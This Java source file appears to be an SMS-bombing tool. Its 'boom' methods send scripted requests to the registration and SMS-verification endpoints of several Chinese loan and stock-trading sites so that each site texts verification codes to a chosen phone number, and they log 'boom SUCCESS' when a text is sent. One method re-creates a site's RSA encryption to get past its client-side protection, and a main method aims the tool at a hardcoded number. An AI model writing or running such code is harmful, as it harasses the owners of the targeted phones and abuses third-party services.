package com.old.driver.fetcher;

import java.io.InputStream;
import java.util.HashMap;
import java.util.Map;

import javax.script.Invocable;
import javax.script.ScriptEngine;
import javax.script.ScriptEngineManager;

import com.old.driver.util.Extracter;
import org.apache.http.client.CookieStore;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.BasicCookieStore;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.log4j.Logger;

import com.mchange.v1.io.InputStreamUtils;
import com.old.driver.util.HttpUtils;

public class OldDriverFetcher extends DriverFetcher {
    private static final Logger logger = Logger.getLogger(OldDriverFetcher.class);

    public OldDriverFetcher() {
        this.client = HttpUtils.getHttpClient(true, cookieStore);
    }

    private static String script1;

    private static String script2;

    private static String script3;

    static {
        try {
            InputStream is = OldDriverFetcher.class.getResourceAsStream("/com/puhui/crawler/mobile/ct_fj/BigInt.js");
            script1 = InputStreamUtils.getContentsAsString(is, HttpUtils.UTF_8);
            is = OldDriverFetcher.class.getResourceAsStream("/com/puhui/crawler/mobile/ct_fj/Barrett.js");
            script2 = InputStreamUtils.getContentsAsString(is, HttpUtils.UTF_8);
            is = OldDriverFetcher.class.getResourceAsStream("/com/puhui/crawler/mobile/ct_fj/RSA.js");
            script3 = InputStreamUtils.getContentsAsString(is, HttpUtils.UTF_8);
            is.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void boom() {
        boomXiaoDing();
        boomXinRong();
        boomZhiNanZhen();
//        boomHeXinDai();
    }

    /**
     * 顶呱呱贷款网
     *
     * @return
     */
    private boolean boomXiaoDing() {// http://yt.juqiwang.net/bj/dk/20170706/index?dkbjbdpc/-15-01-0000-0100#cl2


        String url = "http://yt.juqiwang.net/bj/dk/20170706/index?dkbjbdpc/-15-01-0000-0100#cl2";
        logger.info(getPhone() + url);
        HttpGet get = HttpUtils.get(url);
        try {
            String content = HttpUtils.executeGetWithResult(client, get);
            logger.info(getPhone() + content);

            for (int i = 0; i < 3; i++) {
                url = "http://admin.dggjqw.com/get_imgcode.do?callback=flightHandler&_=" + System.currentTimeMillis();
                logger.info(getPhone() + url);
                get = HttpUtils.get(url);
                content = HttpUtils.executeGetWithResult(client, get);
                logger.info(getPhone() + content);
            }

//            String jsessionid = Extracter.matchFirst(content,"jsessionid=(.*)\"");
//            logger.info(getPhone() + jsessionid);
            url = "http://admin.dggjqw.com/api/get_sms_code2.do?callback=flightHandler&tel=" + getPhone() + "&_="
                    + System.currentTimeMillis();
            logger.info(getPhone() + url);
            get = HttpUtils.get(url);
            get.addHeader("Referer", "http://yt.juqiwang.net/bj/dk/20170706/index?dkbjbdpc/-15-01-0000-0100");
            get.addHeader("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:67.0) Gecko/20100101 Firefox/67.0");
            get.addHeader("Accept", "*/*");
            content = HttpUtils.executeGetWithResult(client, get);
            logger.info(getPhone() + content);
            if (content.contains("验证码已发送至手机")) {
                logger.info("顶呱呱 boom SUCCESS!!");
                return true;
            }
        } catch (Exception e) {
            logger.error(e.getMessage(), e);
        }
        return false;
    }

    /**
     * boom 信融财富 暂时不可用
     *
     * @return
     */
    private boolean boomXinRong() {// https://www.xinrong.com/register/fast.html?c=abd
        try {
            String url = "https://www.xinrong.com/register/fast.html?c=abd";
            HttpUtils.executeGet(client, url);
            url = "https://www.xinrong.com/v2/register/register_tel_captcha_check_ip_and_phone.jso";
            logger.info(getPhone() + url);
            Map<String, Object> params = new HashMap<>();
            params.put("sd", System.currentTimeMillis());
            params.put("tellPhone", getPhone());
            params.put("type", "0");
            params.put("word", "");
            HttpPost post = HttpUtils.post(url, params);
            post.addHeader("Accept", "aplication/json, text/javascript, */*; q=0.01");
            post.addHeader("Accept-Encoding", "gzip, deflate, br");
            post.addHeader("Accept-Language", "en-US,en;q=0.5");
            post.addHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
            post.addHeader("Referer", "https://www.xinrong.com/register/fast.html?c=abd");
            post.addHeader("X-Requested-With", "XMLHttpRequest");

            String content = HttpUtils.executePostWithResult(client, post);
            logger.info(getPhone() + content);
            if (content.contains("成功")) {
                logger.info("信融 boom SUCCESS!!");
                return true;
            }
        } catch (Exception e) {
            logger.error(e.getMessage(), e);
        }
        return false;
    }

    /**
     * boom 指南针 一家炒股公司
     */
    private boolean boomZhiNanZhen() {// http://qy.compass.cn/fenfen2.php?from=baidu_1_17804650_665761281_9625319002_17393673811
        String url = "http://boyi.compass.cn/reg/intreg.php?callback=jQuery16308192311421604185_"
                + System.currentTimeMillis() + "&phone=" + encrypt(getPhone()) + "&name=%E5%BC%A0%E4%B8%89"// 默认为张三
                + "&fromwhere=baidu_1_17804650_665761281_9625319002_17393673811" + "&type=16" + "&_="
                + System.currentTimeMillis();
        logger.info(getPhone() + url);
        HttpGet get = HttpUtils.get(url);
        get.addHeader("Accept", "*/*");
        get.addHeader("Accept-Encoding", "gzip, deflate");
        get.addHeader("Accept-Language", "en-US,en;q=0.5");
        get.addHeader("User-Agent", "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0");
        get.addHeader("Referer", "http://qy.compass.cn/fenfen2.php");
        try {
            String content = HttpUtils.executeGetWithResult(client, get);
            logger.info(getPhone() + content);
            if (content.contains("result\":true")) {
                logger.info("指南针 boom SUCCESS!!");
                return true;
            }
        } catch (Exception e) {
            logger.error(e.getMessage(), e);
        }
        return false;
    }

    /**
     * 和信贷
     *
     * @return
     */
    private boolean boomHeXinDai() {// 和信贷 一家贷款网址
        try {
            String url = "https://www.hexindai.com/login?register=1";
            String content = HttpUtils.executeGetWithResult(client, url);

            url = "https://www.hexindai.com/check/username/exist?_=1" + System.currentTimeMillis();
            Map<String, Object> params = new HashMap<>();
            params.put("username", getPhone());
            params.put("phone", getPhone());
            HttpPost post = HttpUtils.post(url, params);
            post.setHeader("Accept", "application/json, text/javascript, */*; q=0.01");
            post.setHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
            post.setHeader("X-Requested-With", "XMLHttpRequest");
            post.setHeader("Referer", "https://www.hexindai.com/login?register=1");
            content = HttpUtils.executePostWithResult(client, post);
            logger.info(getPhone() + content);

            url = "https://www.hexindai.com/auth_code?_=" + System.currentTimeMillis();
            logger.info(getPhone() + url);
            params = new HashMap<>();
            params.put("captcha", "");
            params.put("phone", getPhone());
            post = HttpUtils.post(url, params);
            post.setHeader("Accept", "application/json, text/javascript, */*; q=0.01");
            post.setHeader("Content-Type", "application/json");
            post.setHeader("X-Requested-With", "XMLHttpRequest");
            post.setHeader("Referer", "https://www.hexindai.com/login?register=1");

            content = HttpUtils.executePostWithResult(client, post);
            logger.info(getPhone() + content);
            if (content.contains("expire\":60")) {
                logger.info("和信贷 boom SUCCESS!!");
                return true;
            }
        } catch (Exception e) {
            logger.error(e.getMessage(), e);
        }
        return false;
    }

    /**
     * 加密方法
     *
     * @param password
     * @return
     */
    private String encrypt(String password) {
        try {
            String maxDigits = "67";
            String email_empoent;
            String email_module;
            email_empoent = "10001";
            email_module = "EC44CB7EB6131B59BCAAA03297309FD8334E7D5E3D780AD585186599C11DD309C15E4D9F330295C21237DBA3D2671EC05E7BA98527A53361279BADDB3E9581AD";
            ScriptEngine engine = new ScriptEngineManager().getEngineByName("javascript");
            engine.eval(script1);
            engine.eval(script2);
            engine.eval(script3);
            String script4 = "function justDoId(){setMaxDigits(" + Integer.parseInt(maxDigits)
                    + "); var key = new RSAKeyPair('" + email_empoent + "','','" + email_module
                    + "'); return encryptedString(key, '" + password + "');}";
            engine.eval(script4);
            if (engine instanceof Invocable) {
                Invocable in = (Invocable) engine;
                String result = (String) in.invokeFunction("justDoId", new Object[0]);
                logger.info("调用js加密密码，加密前为[" + password + "],加密后为[" + result + "]");
                return result;
            }
        } catch (Exception e) {
            logger.error("加密字符串出错", e);
        }
        return password;
    }

    public static void main(String[] args) {
        OldDriverFetcher old = new OldDriverFetcher();
        old.setPhone("18842861234");
        old.boomXiaoDing();
    }

}
